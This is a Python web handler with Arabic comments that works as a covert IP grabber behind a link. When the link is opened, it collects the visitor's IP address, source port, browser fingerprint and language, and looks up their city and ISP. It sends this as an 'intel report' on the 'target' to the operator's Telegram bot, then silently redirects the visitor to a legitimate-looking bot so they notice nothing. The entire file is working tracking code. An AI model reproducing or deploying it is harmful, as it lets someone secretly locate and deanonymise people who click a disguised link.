import os
import requests
from http.server import BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. جلب الإعدادات السرية من Vercel Env
        TOKEN = os.environ.get('BOT_TOKEN')
        CHAT_ID = os.environ.get('MY_CHAT_ID')
        REDIRECT_URL = os.environ.get('ORIGINAL_BOT_URL')

        # 2. سحب البيانات الاستخباراتية (بما فيها الـ Source Port)
        ip_address = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        source_port = self.client_address[1]  # سحب بورت الضحية (الـ 5 أرقام)
        user_agent = self.headers.get('user-agent', 'Unknown Device')
        language = self.headers.get('accept-language', 'Unknown')

        # 3. جلب بيانات الموقع الجغرافي والمزود
        geo_info = "تعذر جلب الموقع"
        try:
            # استخدام ip-api لجلب تفاصيل احترافية
            geo_req = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,country,city,isp,org,as").json()
            if geo_req['status'] == 'success':
                geo_info = (f"🌍 البلد: {geo_req['country']} | 🏙️ المدينة: {geo_req['city']}\n"
                            f"📡 المزود: {geo_req['isp']} | 🏢 المنظمة: {geo_req['org']}")
        except:
            pass

        # 4. تنسيق التقرير الاستخباري الرقمي
        report = (
            "🛡️ **[ INTEL REPORT: TARGET DETECTED ]** 🛡️\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🌐 **IP Address:** `{ip_address}`\n"
            f"🔌 **Source Port:** `{source_port}`\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📍 **Geographic Info:**\n{geo_info}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📱 **Fingerprint:** `{user_agent}`\n"
            f"🌐 **Language:** `{language}`\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🚀 **Status:** Redirected to Target Bot"
        )

        # 5. إرسال التقرير فوراً لتليجرام
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                          json={"chat_id": CHAT_ID, "text": report, "parse_mode": "Markdown"})
        except:
            pass

        # 6. التوجيه الفوري الصامت (302 Redirect)
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
